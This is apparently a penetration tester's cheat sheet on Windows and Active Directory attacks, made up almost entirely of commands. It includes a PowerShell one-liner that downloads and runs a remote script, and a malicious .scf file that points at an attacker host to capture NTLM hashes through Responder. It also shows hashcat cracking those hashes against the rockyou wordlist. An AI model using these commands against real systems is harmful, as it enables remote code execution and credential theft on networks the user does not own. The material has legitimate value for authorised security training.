# Traffic Capture
```powershell



```

# Process Command Lines
```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

Procmon.ps1

IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

# Poisining Attacks
### [LLMNR-NBTNS-mDNS Poisining](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)


# Capturing Hashes with a Malicious .scf File
```powershell
sudo responder -I eth0 -dwv

PS C:\Tools> net share
Share name   Resource                        Remark
-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Department Shares  C:\Department Shares

@Inventory.scf:
[Shell]
Command=2
IconFile=\\\\<ATTACKER_IP>@<PORT>\\share\\legit.ico
[Taskbar]
Command=ToggleDesktop

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
